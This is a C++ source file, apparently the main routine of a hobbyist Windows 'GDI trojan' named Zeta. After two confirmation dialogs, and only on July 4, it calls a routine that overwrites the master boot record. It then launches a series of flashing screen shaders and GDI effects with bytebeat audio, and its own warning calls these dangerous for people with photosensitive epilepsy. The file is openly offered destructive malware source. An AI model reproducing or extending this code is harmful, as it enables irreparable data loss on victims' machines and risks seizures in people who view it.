#include "Zeta.h"

INT LCDECL pWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, INT nShowCmd) 
{
		if (MessageBoxW(NULL,
		L"WIN32.ZETA.EXE\n\nThis malware you are running was not made for people with photosensitive epilepsy and can harm your data beyond repair.\nBooky20 is not responsible for any damage made with it.\n\nRunning it on physical hardware? Shut the malware down and delete it.\nBut on a VM, you can just run it\n\nStill execute it?",
		L"GDI-Trojan.Win32.Zeta (Special thx to RaduMinecraft)",
		MB_ICONWARNING | MB_YESNO | MB_DEFBUTTON2) != IDYES || MessageBoxW(NULL,
		L"Final warning!\n\nBooky20 is not responsible for any damages made with this trojan horse!\nStill proceed to execute it?",
		L"You didn\'t listen...",
		MB_ICONWARNING | MB_YESNO | MB_DEFBUTTON2) != IDYES) exit(0);

//	Payloads::SystemToolDisable(); Please make it have more originallity.
	if (System::DateCheck(DATE_MONTH) == 7 && System::DateCheck(DATE_DAY) == 4) {
		InvalidateRect(NULL, NULL, FALSE); // Refreshes the screen like on Windows 7
		System::OverwriteMBR();
//		HEAP model = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_NO_SERIALIZE, sizeof(CHAR) * 8192 * 64, 0); Why?
		// 3D rotating... thing. //
		CreateThread(NULL, 0, &_3D::Model3D, NULL, 0, 0); 
		
			// COLORPAL32 moving XOR //
			HANDLE hTMXOR = CreateThread(NULL, 0, &Shaders::TiltedMovingXORRGB, NULL, 0, 0); // Rotated XOR (it moves)
			Bytebeat::Bytebeat1();
			WaitForSingleObject(hTMXOR, 29000);
			CloseHandle(hTMXOR);
			Refresh();
			hwo_reset();
			Sleep(100);
			
//			HEAP hsv = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_NO_SERIALIZE, sizeof(CHAR) * 8192 * 64, 0); Why though?
			HANDLE hSRGBM = CreateThread(NULL, 0, &Shaders::StripedRGBMovement, NULL, 0, 0); // Uses a height value
			Bytebeat::wBytebeat2();
			WaitForSingleObject(hSRGBM, 30000);
			CloseHandle(hSRGBM);
//			HeapDestroy(hsv);
			hwo_reset();
			Refresh();
			Sleep(100);
			
			HANDLE hASR = CreateThread(NULL, 0, &GDI::AngledSineRotation, NULL, 0, 0);
			Sleep(1);
			HANDLE hRANDF = CreateThread(NULL, 0, &Shaders::RainbowANDFractals, NULL, 0, 0); // (Also moving) Sierpinski triangles
			Bytebeat::Bytebeat3();
			WaitForSingleObject(hASR, 31000);
			WaitForSingleObject(hRANDF, 1);
			CloseHandle(hASR); CloseHandle(hRANDF);
			hwo_reset();
			Refresh();
			Sleep(100);
			
			HANDLE hTP = CreateThread(NULL, 0, &Shaders::TangentPlasma, NULL, 0, 0); // Wave shader
			Bytebeat::Bytebeat4();
			WaitForSingleObject(hTP, 30000);
			CloseHandle(hTP);
			hwo_reset();
			Refresh();
			
			HANDLE hOFC = CreateThread(NULL, 0, &Shaders::ORFractalClutter, NULL, 0, 0);
			Sleep(1);
			HANDLE hAG = CreateThread(NULL, 0, &GDI::AlphaGliding, NULL, 0, 0);
			Bytebeat::Bytebeat5();
			WaitForSingleObject(hOFC, 29000);
			WaitForSingleObject(hAG, 1);
			CloseHandle(hOFC); CloseHandle(hAG);
			hwo_reset();
			Refresh();
			
			HANDLE hRC = CreateThread(NULL, 0, &Shaders::RandomCircle, NULL, 0, 0);
			Sleep(1);
			HANDLE hGT = CreateThread(NULL, 0, &GDI::GradientTriangles, NULL, 0, 0);
			Bytebeat::Bytebeat6();
			WaitForSingleObject(hRC, 30000);
			WaitForSingleObject(hGT, 1);
			CloseHandle(hRC); CloseHandle(hGT);
			hwo_reset();
			Refresh();
			
			HANDLE hVP = CreateThread(NULL, 0, &Shaders::VerticalPlasma, NULL, 0, 0);
			Sleep(1);
			HANDLE hIP = CreateThread(NULL, 0, &GDI::IconPattern, NULL, 0, 0);
			Bytebeat::Bytebeat7();
			WaitForSingleObject(hVP, 31000);
			WaitForSingleObject(hIP, 1);
			CloseHandle(hVP); CloseHandle(hIP);
			hwo_reset();
			Refresh();
			
			HANDLE hAVRZ = CreateThread(NULL, 0, &Shaders::ANDVerticalRotozoomer, NULL, 0, 0);
			Sleep(1);
			HANDLE hGLTO = CreateThread(NULL, 0, &GDI::GreekLetterTexts, NULL, 0, 0);
			Bytebeat::Bytebeat8();
			WaitForSingleObject(hAVRZ, 30000);
			WaitForSingleObject(hGLTO, 1);
			CloseHandle(hAVRZ); CloseHandle(hGLTO);
			hwo_reset();
			Refresh();
			
    }
}

